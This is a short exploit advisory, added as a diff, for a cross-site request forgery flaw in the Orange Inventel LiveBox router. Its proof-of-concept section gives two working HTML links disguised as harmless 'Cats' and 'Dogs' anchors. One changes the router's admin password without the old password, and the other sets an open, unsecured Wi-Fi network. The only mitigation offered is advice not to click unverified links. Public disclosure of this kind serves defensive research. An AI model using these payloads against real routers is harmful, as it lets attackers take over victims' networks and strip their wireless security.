@@ -1,0 +1,28 @@
+# Exploit Title: Orange Inventel LiveBox CSRF
+# Google Dork: N/A
+# Date: 10-24-2016
+# Exploit Author: BlackMamba TEAM (BM1)
+# Vendor Homepage: N/A
+# Version: Inventel - v5.08.3-sp
+# Tested on: Windows 7 64bit
+# CVE : N/A
+# Category: Hardware
+
+1. Description
+This Router is vulnerable to Cross Site Request Forgery , a hacker can send a well crafted link or well crafted web page(see the POC) to the administrator.
+and thus change the admin password (without the need to know the old one).
+this affects the other  settings too (SSID name , SSID Security ,enabling disabling the firewall.......).
+
+2. Proof of Concept
+this link once clicked the admin password is changed to "blackmamba" (withouth ")
+
+<a href="http://192.168.1.1/configok.cgi?sysPassword=blackmamba">Cats !!!</a>
+
+this link once clicked sets the SSID to "BLACKMAMBA" with the security to NONE (open wirless network)
+<a href="http://192.168.1.1/advancedboot.cgi?associateTime=10&wifiEssid=BLACKMAMBA&wifiWep=0">Dogs :D !!!</a>
+
+3. Mitigation
+this is kinda obvious but DO NOT click on links you can't verify there origine specialy when connected to the Router's interface.
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+From the Moroccan team : BLACK MAMBA (by BM1)
